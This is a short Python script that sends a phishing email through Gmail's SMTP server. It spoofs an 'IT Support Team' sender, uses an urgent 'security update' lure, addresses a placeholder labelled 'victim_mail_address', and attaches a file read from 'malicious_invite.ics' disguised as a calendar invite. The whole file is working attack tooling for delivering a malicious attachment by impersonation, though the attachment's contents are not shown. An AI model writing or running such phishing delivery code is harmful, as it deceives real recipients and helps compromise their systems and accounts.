import smtplib
from email.message import EmailMessage
from email.utils import formataddr

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# Your Gmail credentials (use App Password if 2FA enabled)
GMAIL_USER = 'your_gmail_address'
GMAIL_PASS = 'your_app_password_here'  # Replace with your app password

FROM_NAME = 'IT Support Team'
FROM_EMAIL = 'itsupport@example.com'
TO_EMAIL = 'victim_mail_address'
SUBJECT = 'Urgent Security Update Required'

with open('malicious_invite.ics', 'r') as f:
    ics_content = f.read()

msg = EmailMessage()
msg['Subject'] = SUBJECT
msg['From'] = formataddr((FROM_NAME, FROM_EMAIL))
msg['To'] = TO_EMAIL

msg.set_content("""\
Dear User,

Please find the attached calendar invite for the mandatory security update.

Best Regards,
IT Support Team
""")

msg.add_attachment(
    ics_content.encode('utf-8'),
    maintype='text',
    subtype='calendar',
    filename='invite.ics',
    disposition='attachment',
    headers=['Content-Class: urn:content-classes:calendarmessage']
)

try:
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(GMAIL_USER, GMAIL_PASS)
    server.send_message(msg)
    print("Email sent successfully!")
except Exception as e:
    print("Failed to send email:", e)
finally:
    server.quit()
